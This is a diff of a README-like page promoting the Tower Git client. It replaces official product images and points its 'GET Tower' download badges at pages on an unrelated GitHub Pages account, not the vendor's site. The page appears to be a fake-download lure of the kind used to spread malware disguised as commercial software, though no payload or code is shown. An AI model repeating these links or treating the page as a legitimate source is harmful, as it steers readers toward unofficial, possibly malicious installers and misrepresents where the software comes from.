@@ -7,9 +7,9 @@ Tower is a graphical Git client for developers who need a clear view of reposito
 
 The application supports reviewing modifications, staging selected lines, comparing revisions, managing stashes, and working through merge conflicts. Branch review tools also help identify branches that may need attention before repository cleanup.
 
-![Tower Banner](https://www.git-tower.com/assets/img/press/tower-icon.png)
+![Tower Banner](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSXEz1XCrJsC57L-X2-d226U7ME6b5MvzPVDds8RSk_7wm7l8xMtI1zZ3Nb&s=10)
 
-[![GET](https://img.shields.io/badge/GET-Tower-0078D6?style=for-the-badge&labelColor=555555)](https://xarannaolinalis.github.io/.github/Tower-Git-Client)
+[![GET](https://img.shields.io/badge/GET-Tower-0078D6?style=for-the-badge&labelColor=555555)](https://xarannaolinalis.github.io/.github/Tower-Repository-Manager)
 
 ## Repository Management Features
 
@@ -30,7 +30,7 @@ The application supports reviewing modifications, staging selected lines, compar
 
 ## Exploring the Working Copy
 
-![Tower Working Copy Interface](https://www.git-tower.com/assets/img/release-notes/windows/14/working-copy.png)
+![Tower Working Copy Interface](https://cdn.mos.cms.futurecdn.net/ejwk9A6J5JjE66sVtBt7rZ.jpg)
 
 The Working Copy view provides a focused place to inspect pending modifications before creating a commit. Review individual files, compare changed content, and stage only the sections that belong in the next changeset.
 
@@ -44,7 +44,7 @@ Before deleting or integrating a branch, review its changes and confirm that the
 
 ## Get Tower
 
-[![GET](https://img.shields.io/badge/GET-Tower-0078D6?style=for-the-badge&labelColor=555555)](https://xarannaolinalis.github.io/.github/Tower-Git-Client)
+[![GET](https://img.shields.io/badge/GET-Tower-0078D6?style=for-the-badge&labelColor=555555)](https://xarannaolinalis.github.io/.github/Tower-Repository-Manager)
 
 ## Preparing Changes for Integration
 
